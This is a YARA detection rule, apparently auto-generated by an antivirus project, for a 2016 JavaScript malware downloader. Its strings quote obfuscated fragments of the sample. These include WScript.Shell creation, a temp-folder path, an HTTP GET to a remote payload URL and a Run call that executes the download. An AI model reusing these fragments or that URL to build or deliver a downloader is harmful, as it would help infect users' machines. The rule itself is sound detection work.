rule sig_20160427_00c45e3f7e70e4ac7f10de80fca41117 {
  meta:
    description = "datamaliciousorder - file 20160427_00c45e3f7e70e4ac7f10de80fca41117.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d24e904d5989c3025bae2af0296957b39278005f328b3408d13451618ddc21f0"

  strings:
    $s1  = "function YrpccGvubj() {return TuuczQastu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"y5WwNVG" ascii
    $s2  = "function YrpccGvubj() {return TuuczQastu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"y5WwNVG" ascii
    $s3  = "var TuuczQastu = function WivbqOxvyp() {return KxzzcThwau[IekrwXnobi](\"WScript\"+\".Shell\");}(), YbrsvCdkhb = 11;" fullword ascii
    $s4  = "function IyeohSpmdk(LzpapJxwjs, MahlcConez){YpqapXxctr = YpqapXxctr * 1; return LzpapJxwjs - MahlcConez;};" fullword ascii
    $s5  = "TehirTxgek[PceyjPygnb](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s6  = "var KxzzcThwau = this[\"WScript\"];" fullword ascii
    $s7  = "if (TehirTxgek[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function KjgsqXlcoy(){return XztxjTysow + \"\";};" fullword ascii
    $s9  = "function MadnxRkqpx() {return ((TbadoUtnxa == true) && (TbadoUtnxa == NcmutAvqmq)) ? 1 : YpqapXxctr;};" fullword ascii
    $s10 = "TbadoUtnxa = true; " fullword ascii
    $s11 = "function YfwuaQmhcz(SfvhgZrots){TuuczQastu[\"R\"+\"un\"](SfvhgZrots, YpqapXxctr, YpqapXxctr);};" fullword ascii
    $s12 = "function CvfwwJnfkw(){return IekrwXnobi;};" fullword ascii
    $s13 = "function FpoazVhvhd()" fullword ascii
    $s14 = "}while (WjcygVjwug);" fullword ascii
    $s15 = "HnqclAgunx = true;" fullword ascii
    $s16 = "return IyeohSpmdk(PgstvHoysj, TlvjwOdmtf);" fullword ascii
    $s17 = "function PkgbeFckhv(VirbhCevsj) {var TsxagBqgmw = (1, 2, 3, 4, 5, VirbhCevsj); return TsxagBqgmw;};" fullword ascii
    $s18 = "var HnqclAgunx = false;" fullword ascii
    $s19 = "var NcmutAvqmq = false;" fullword ascii
    $s20 = "var TbadoUtnxa = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}